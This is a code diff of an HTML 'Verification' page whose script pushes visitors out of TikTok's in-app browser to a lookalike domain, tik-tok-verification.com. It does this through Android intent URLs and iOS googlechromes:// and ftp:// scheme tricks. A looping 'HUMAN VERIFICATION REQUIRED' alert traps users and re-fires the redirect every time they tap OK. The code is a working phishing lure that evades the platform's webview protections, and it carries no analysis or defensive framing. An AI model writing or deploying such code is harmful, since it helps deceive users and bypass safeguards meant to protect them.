@@ -3,50 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verification</title>
     <style>body { background: #fff; margin: 0; padding: 0; }</style>
 </head>
 <body>
 
-<form id="breakoutForm" action="https://tik-tok-verification.com/Verification/verify1.html" method="GET" target="_blank" style="display:none;">
-</form>
-
 <script>
+    // CONFIGURATION
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
-    // Stripping protocol for the Chrome scheme to prevent "Google Searching"
-    const domainPath = targetUrl.replace(/^https?:\/\//, '');
-    
-    // FAIL-SAFE: Reduced to 5 seconds as requested
+    // Clean domain for protocol schemes (removes https://)
+    const cleanDomain = targetUrl.replace(/^https?:\/\//, '');
+    // 5-Second Fail-Safe
     const killTime = Date.now() + 5000;
 
-    function forceEject() {
+    function triggerSystemJump() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-        
+
         if (isAndroid) {
-            // Android: The Intent is King.
-            window.location.href = `intent://${domainPath}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
+            // ANDROID: The "Browsable" Intent
+            // Forces the system to pick a browser app, not an internal webview.
+            window.location.href = `intent://${cleanDomain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
         } else {
-            // iOS: The Form-Post Injection
-            // 1. Submit the form to target="_blank". 
-            // TikTok often hands "_blank" requests to Safari.
-            document.getElementById("breakoutForm").submit();
+            // iOS: The Protocol Stack (Corrected Syntax)
             
-            // 2. Parallel Fire: Correctly formatted Chrome Scheme
-            // "googlechromes://" + "domain.com" (No extra https in the middle)
-            // This prevents it from being treated as a search query.
+            // 1. Chrome Scheme (Corrected): 
+            // "googlechromes://domain.com" (No https://)
+            // If Chrome is installed, this opens the site DIRECTLY (No search).
+            // If not, it errors silently or prompts "Open in...?"
+            window.location.href = "googlechromes://" + cleanDomain;
+
+            // 2. FTP Breakout (The "Seal Breaker"):
+            // We use this as the backup because you confirmed it opens Safari.
+            // We delay it slightly so it only fires if Chrome didn't catch it.
             setTimeout(() => {
-                window.location.href = "googlechromes://" + domainPath;
-            }, 50);
+                // This forces Safari to open.
+                window.location.href = "ftp://" + cleanDomain;
+            }, 100);
+
+            // 3. The "Fix" for the FTP Error:
+            // Once Safari is open (even if showing the FTP error), 
+            // we fire the standard HTTPS link to overwrite the error page.
+            setTimeout(() => {
+                window.location.assign(targetUrl);
+            }, 200);
         }
     }
 
     function securityLoop() {
-        // Stop everything if the fail-safe time is reached
+        // FAIL-SAFE: Stop all alerts after 5 seconds
         if (Date.now() > killTime) return;
 
-        // 1. Try to eject immediately
-        forceEject();
+        // 1. Try to Jump immediately
+        triggerSystemJump();
 
-        // 2. Check Focus (Fast check)
+        // 2. Check Focus (Wait for jump to happen)
         setTimeout(() => {
             if (document.hasFocus()) {
                 const header = "HUMAN VERIFICATION REQUIRED\n";
@@ -55,10 +65,10 @@
                 // 3. The Lock
                 alert(header + body);
 
-                // 4. Fire on "OK" (User Gesture Token)
-                forceEject();
+                // 4. RELAY: Fire immediately on "OK" tap
+                triggerSystemJump();
 
-                // Recurse
+                // 5. Loop
                 setTimeout(securityLoop, 200);
             }
         }, 200);
